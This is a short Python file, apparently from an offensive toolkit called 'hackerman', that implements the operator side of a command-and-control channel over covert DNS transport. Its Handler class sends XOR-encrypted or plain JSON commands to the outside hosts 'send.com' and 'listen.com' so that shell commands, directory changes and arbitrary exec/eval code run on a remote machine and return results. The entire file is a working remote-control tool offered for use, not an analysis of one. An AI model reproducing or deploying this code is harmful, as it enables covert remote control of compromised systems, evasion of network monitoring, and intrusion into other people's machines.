from hackerman.transport.covert import dns
from hackerman.crypto import xor
from hackerman import utils
import json, time

class NoCrypt(object):
	def encrypt(self, raw):
		return raw
	def decrypt(self, raw):
		return raw
class XORCrypt(object):
	def __init__(self, password):
		self.pwd = password
	def encrypt(self, raw):
		return xor.encrypt(raw, self.pwd)
	def decrypt(self, raw):
		return xor.decrypt(raw, self.pwd)

class Handler(object):
	def __init__(self, crypt, send="send.com", listen="listen.com"):
		self.encrypt = crypt.encrypt
		self.decrypt = crypt.decrypt
		self.client = dns.SpeedyClient(send=send, listen=listen)
	def send_cmd(self, cmd):
		enc = self.encrypt(json.dumps(cmd).encode())
		self.client.send(enc)
	def get_result(self):
		recv = self.client.recv()
		dec = self.decrypt(recv)
		return json.loads(dec)

	def sh(self, cmd):
		pl = {'type':'sh','cmd':cmd}
		self.send_cmd(pl)
		return utils.b64d(self.get_result()['res'])
	def cd(self, dir):
		pl = {'type':'cd','dir':dir}
		self.send_cmd(pl)
		return self.get_result()['res']
	def exec(self, code):
		pl = {'type':'exec','code':code}
		self.send_cmd(pl)
		return self.get_result()['res']
	def eval(self, code):
		pl = {'type':'eval','code':code}
		self.send_cmd(pl)
		return self.get_result()['res']
